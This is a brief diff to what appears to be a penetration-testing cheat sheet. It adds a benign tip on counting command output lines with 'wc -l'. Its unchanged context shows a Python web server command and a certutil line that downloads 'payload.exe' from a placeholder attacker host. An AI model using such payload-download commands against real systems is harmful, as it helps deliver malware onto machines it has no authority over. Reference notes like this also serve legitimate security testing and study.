@@ -53,3 +53,9 @@ python -m SimpleHTTPServer 80
 ```
 certutil -urlcache -f http://<lhost>/payload.exe payload.exe
 ```
+
+10) How to count the number of lines in the output of a command ?
+```
+<command-of-a-tool> | wc -l
+```
+
